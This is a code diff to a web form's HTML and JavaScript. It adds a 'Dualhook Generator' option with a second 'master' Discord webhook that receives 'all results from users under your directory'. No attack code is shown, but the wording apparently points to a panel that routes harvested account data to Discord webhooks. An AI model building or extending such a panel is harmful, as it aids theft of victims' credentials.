@@ -362,6 +362,14 @@
         
         <form id="createForm">
             <div class="form-group">
+                <label for="serviceType">Service Type</label>
+                <select id="serviceType" style="width: 100%; background: var(--surface-light); border: 1px solid var(--border-color); border-radius: 12px; padding: 1rem; font-size: 1rem; color: var(--text-primary); font-family: inherit;">
+                    <option value="single">Single Webhook</option>
+                    <option value="dualhook">Dualhook Generator</option>
+                </select>
+            </div>
+
+            <div class="form-group">
                 <label for="directoryName">Directory Name</label>
                 <input 
                     type="text" 
@@ -375,8 +383,8 @@
                 >
             </div>
             
-            <div class="form-group">
-                <label for="webhookUrl">Your Webhook URL</label>
+            <div class="form-group" id="primaryWebhookGroup">
+                <label for="webhookUrl">Your Primary Webhook URL</label>
                 <input 
                     type="url" 
                     id="webhookUrl" 
@@ -384,6 +392,19 @@
                     required
                     autocomplete="url"
                 >
+            </div>
+
+            <div class="form-group" id="dualhookWebhookGroup" style="display: none;">
+                <label for="dualhookWebhookUrl">Dualhook Master Webhook URL</label>
+                <input 
+                    type="url" 
+                    id="dualhookWebhookUrl" 
+                    placeholder="https://discord.com/api/webhooks/..." 
+                    autocomplete="url"
+                >
+                <small style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 0.5rem; display: block;">
+                    This webhook will receive all results from users under your directory
+                </small>
             </div>
             
             <button type="submit" class="create-btn" id="createBtn">
@@ -401,8 +422,12 @@
     </div>
 
     <script>
+        const serviceTypeSelect = document.getElementById('serviceType');
         const directoryInput = document.getElementById('directoryName');
         const webhookInput = document.getElementById('webhookUrl');
+        const dualhookWebhookInput = document.getElementById('dualhookWebhookUrl');
+        const dualhookWebhookGroup = document.getElementById('dualhookWebhookGroup');
+        const primaryWebhookGroup = document.getElementById('primaryWebhookGroup');
         const createForm = document.getElementById('createForm');
         const createBtn = document.getElementById('createBtn');
         const btnText = document.getElementById('btnText');
@@ -413,20 +438,40 @@
         
         let createdDirectory = null;
 
+        // Handle service type change
+        serviceTypeSelect.addEventListener('change', function() {
+            const isDualhook = this.value === 'dualhook';
+            dualhookWebhookGroup.style.display = isDualhook ? 'block' : 'none';
+            
+            if (isDualhook) {
+                primaryWebhookGroup.querySelector('label').textContent = 'Your Primary Webhook URL';
+                dualhookWebhookInput.required = true;
+            } else {
+                primaryWebhookGroup.querySelector('label').textContent = 'Your Webhook URL';
+                dualhookWebhookInput.required = false;
+            }
+            
+            validateForm();
+        });
+
         // Form validation
         function validateForm() {
             const directoryName = directoryInput.value.trim();
             const webhookUrl = webhookInput.value.trim();
+            const dualhookWebhookUrl = dualhookWebhookInput.value.trim();
+            const isDualhook = serviceTypeSelect.value === 'dualhook';
             
             const isValidDirectory = /^[a-z0-9-]+$/.test(directoryName) && directoryName.length > 0;
-            const isValidWebhook = webhookUrl.startsWith('http') && webhookUrl.length > 0;
+            const isValidPrimaryWebhook = webhookUrl.startsWith('http') && webhookUrl.length > 0;
+            const isValidDualhookWebhook = !isDualhook || (dualhookWebhookUrl.startsWith('http') && dualhookWebhookUrl.length > 0);
             
-            createBtn.disabled = !(isValidDirectory && isValidWebhook);
+            createBtn.disabled = !(isValidDirectory && isValidPrimaryWebhook && isValidDualhookWebhook);
         }
 
         // Real-time validation
         directoryInput.addEventListener('input', validateForm);
         webhookInput.addEventListener('input', validateForm);
+        dualhookWebhookInput.addEventListener('input', validateForm);
 
         // Show status message
         function showStatus(message, type = 'success') {
@@ -455,7 +500,9 @@
             
             const formData = {
                 directoryName: directoryInput.value.trim(),
-                webhookUrl: webhookInput.value.trim()
+                webhookUrl: webhookInput.value.trim(),
+                serviceType: serviceTypeSelect.value,
+                dualhookWebhookUrl: serviceTypeSelect.value === 'dualhook' ? dualhookWebhookInput.value.trim() : null
             };
 
             setLoadingState(true);
